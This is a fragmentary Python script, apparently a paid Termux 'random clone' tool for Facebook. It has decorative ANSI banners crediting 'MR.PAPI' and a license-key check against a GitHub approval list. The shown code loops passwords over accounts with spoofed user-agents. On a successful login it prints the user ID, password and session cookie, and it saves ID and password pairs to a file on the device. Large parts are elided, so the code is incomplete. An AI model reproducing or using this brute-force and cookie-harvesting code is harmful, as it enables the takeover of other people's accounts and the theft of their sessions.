...
ha = current.day
today = date.today()
#ANAK2 = "\033[1;33m➤\033[1;32m➤\x1b[0m"
...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96mANAK')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-ANAK/1.2.0 OPN-B'
...
\033[1;34m         o           o          o           o           o         o/ 
 \x1b[1;36m        <|>         <|\        <|>         <|>         <|>       /v  
\033[1;96m        / \         / \\o      / \         / \         / >      />   
\x1b[1;97m      o/   \o       \o/ v\     \o/       o/   \o       \o__ __o/     
\x1b[1;91m     <|__ __|>       |   <\     |       <|__ __|>       |__ __|       
\033[1;31m   /       \      / \    \o  / \      /       \       |      \     
\x1b[1;93m  o/         \o    \o/     v\ \o/    o/         \o    <o>      \o   
\x1b[1;97m  /v           v\    |       <\ |    /v           v\    |        v\  
\x1b[1;36m  />             <\  / \        < \  />             <\  / \        <\ 
                                                                     
                                                                                                                                                                                             
        
 \x1b[1;94m××××××××××××××××××××🌺PAPI_T3RMUX_WORLD🌺×××××××××××××××××××××
 \x1b[1;94m★     \x1b[1;96m[💋] CREATED BY\33[0;m   :  \x1b[1;96mMR.PAPI        \x1b[1;94m★
 \x1b[1;94m★     \x1b[1;92m[💋] FACEBOK      : \x1b[1;34m ANAK KUMAR          \x1b[1;94m★
 \x1b[1;94m★     \x1b[1;91m[💋] GITHUB       :  \x1b[1;91mPAPI-X               \x1b[1;94m★
 \x1b[1;94m★     \x1b[1;96m[💋] TOOL STATUS  : \x1b[1;96m R4NDOM-CLONE        \x1b[1;94m★
 \x1b[1;94m★     \x1b[1;91m[💋] TEAM         :  \x1b[1;91m P4P1                  \x1b[1;94m★
...
def shoha_menu():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://raw.githubusercontent.com/PAPI-X/Paid-1/main/Approve.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("              7 DAY = 200 TK 30 day = 500 tk free tryal 5 day ")
        print (" Your Key : "+ANAK+id)
        print ("\n")
        ...
        for ps in pwx:
           ...
           'user-agent': ff}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[151:166]
                print('\033[1;92m[ANAK-OK🌻] '+uid+' | '+ps+'\033[0;97m')
                print(f'{B}[COOKIE🎁] {H}'+coki)
                cek_apk(session,coki)
                open('/sdcard/ANAK-OK.txt', 'a').write(uid+' | '+ps+'\n')
                ok.append(uid)
                break
            else:
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91mANAK","\x1b[1;92mANAK","\x1b[1;93mANAK","\x1b[1;94mANAK","\x1b[1;95mANAK","\x1b[1;96mANAK","\x1b[1;97mANAK","\x1b[1;91mANAK","\x1b[1;92mANAK","\x1b[1;93mANAK","\x1b[1;94mANAK","\x1b[1;95mANAK","\x1b[1;96mANAK"])
